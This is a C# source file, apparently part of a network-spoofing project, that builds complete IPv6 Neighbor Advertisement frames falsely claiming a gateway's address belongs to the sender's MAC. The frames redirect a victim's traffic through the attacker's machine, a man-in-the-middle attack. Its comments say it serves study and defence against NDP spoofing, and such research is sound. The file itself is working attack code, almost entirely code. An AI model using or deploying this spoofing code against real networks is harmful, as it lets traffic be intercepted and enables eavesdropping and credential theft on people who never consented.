using SharpPcap;
using System.Net;
using System.Net.NetworkInformation;

/// <summary>
/// Builds IPv6 Neighbor Discovery Protocol (NDP) <i>Neighbor Advertisement</i>
/// frames - the IPv6 counterpart to a gratuitous ARP reply.
///
/// The advertisement tells the victim that <c>pSpoofedIp</c> (typically the
/// gateway) is reachable via this machine's MAC address, so the victim starts
/// sending the matching traffic to us. This is the exact mirror of the ARP
/// path in <see cref="Arp_Class"/> and exists for studying / defending against
/// NDP spoofing (see the project README).
/// </summary>
class Ndp_Class
{
    private readonly ILiveDevice liveDevice;

    // Neighbor Advertisement flags (RFC 4861 §4.4): Solicited (0x40) + Override
    // (0x20). Override tells the receiver to replace any cached entry.
    private const byte NaFlags = 0x60;

    private const byte NeighborAdvertisementType = 136;

    // Target link-layer address option (RFC 4861 §4.6.1): type 2, length 1 (in
    // units of 8 bytes).
    private const byte TargetLinkLayerAddressOption = 0x02;
    private const byte OptionLengthInEightByteUnits = 0x01;

    public Ndp_Class(ILiveDevice pLiveDevice)
    {
        liveDevice = pLiveDevice;
    }

    /// <summary>
    /// Builds a complete Ethernet frame carrying an ICMPv6 Neighbor
    /// Advertisement for <paramref name="pSpoofedIp"/>, addressed to the victim.
    /// </summary>
    /// <param name="pVictimIp">Destination IPv6 address (the victim).</param>
    /// <param name="pSpoofedIp">The IPv6 address we claim to own (the gateway).</param>
    /// <param name="pVictimMac">The victim's hardware address.</param>
    /// <returns>Ready-to-send wire bytes of the Ethernet frame.</returns>
    public byte[] BuildNeighborAdvertisement(IPAddress pVictimIp, IPAddress pSpoofedIp, PhysicalAddress pVictimMac)
    {
        PhysicalAddress ourMac = liveDevice.MacAddress;

        // --- ICMPv6 Neighbor Advertisement message (32 bytes) ---
        // [0..4)  type, code, checksum
        // [4..8)  flags + reserved
        // [8..24) target address (the address being advertised)
        // [24..32) target link-layer address option (type, length, MAC)
        byte[] icmp = new byte[32];
        icmp[0] = NeighborAdvertisementType;
        icmp[1] = 0; // code
        // icmp[2..4] checksum - left zero, computed below.
        icmp[4] = NaFlags;
        Buffer.BlockCopy(pSpoofedIp.GetAddressBytes(), 0, icmp, 8, 16);
        icmp[24] = TargetLinkLayerAddressOption;
        icmp[25] = OptionLengthInEightByteUnits;
        Buffer.BlockCopy(ourMac.GetAddressBytes(), 0, icmp, 26, 6);

        ushort checksum = PacketUtil_Class.ComputeIcmpV6Checksum(pSpoofedIp, pVictimIp, icmp);
        icmp[2] = (byte)(checksum >> 8);
        icmp[3] = (byte)(checksum & 0xFF);

        return PacketUtil_Class.BuildIcmpV6Frame(ourMac, pVictimMac, pSpoofedIp, pVictimIp, icmp);
    }
}
